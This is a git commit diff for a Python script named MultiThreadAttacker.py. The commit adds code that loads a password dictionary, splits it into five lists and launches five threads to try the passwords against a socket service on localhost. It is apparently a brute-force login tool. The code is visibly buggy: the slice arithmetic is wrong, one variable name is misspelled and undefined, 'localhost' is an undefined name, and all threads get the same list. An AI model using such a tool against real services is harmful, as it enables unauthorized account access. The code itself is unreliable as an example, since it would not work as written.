85ae2a90693de348d68264210ff943ded35c4a73
Samuel <mr.dengshuoling@gmail.com>
2013-04-11 17:05:18 +0800

    Finish

--- MultiThreadAttacker.py
+++ MultiThreadAttacker.py
@@ -1,5 +1,7 @@
 #!/usr/bin/python
 
+#assume that 5 thread to use
+
 import socket;
 import threading;
 
@@ -40,5 +42,34 @@ class AttrackerThread(threading.Thread):
 		startAttack();
 		print 'Stop:' + self.threadID;
 
-# fetch the file<./self.threadID.txt> and parse it into N string lists.
-def 
+# fetch the file<./PasswordDictionary.txt" and parse it into N string lists.
+def fetch():
+	fileReader = open("PasswordDictionary.txt");
+	rawPasswords = fileReader.read();
+	passwordList = 	rawPasswords.split('\n');
+	lengthPasswordList = len(passwordList);
+	print len(passwordList);
+	passwordlist1 = passwordList[:lengthPasswordList/5];
+	passwordlist2 = passwordList[lengthPasswordList/5+1:2*lengthPasswordList];
+	passwordlist3 = passwordList[2*lengthPasswordList/5+1:3*lengthPasswordList];
+	passwordlist4 = passwordList[3*lengthPasswordList/5+1:4*lengthPasswordList];
+	passwordlist5 = passwordList[4*lengthPasswordlist/5+1:];
+
+	return ( passwordlist1,passwordlist2, passwordlist3, passwordlist4, passwordlist5); 
+#Main Function is here
+passwrd1, passwrd2, passwrd3, passwrd4, passwrd5 = fetch();
+
+thread1 = AttrackerThread('Thread001',passwrd1,localhost,12345);
+thread1.start();
+
+thread2 = AttrackerThread('Thread002',passwrd1,localhost,12345); 
+thread2.start();
+
+thread3 = AttrackerThread('Thread003',passwrd1,localhost,12345);
+thread3.start();
+
+thread4 = AttrackerThread('Thread004',passwrd1,localhost,12345); 
+thread4.start();
+
+thread5 = AttrackerThread('Thread005',passwrd1,localhost,12345); 
+thread5.start();
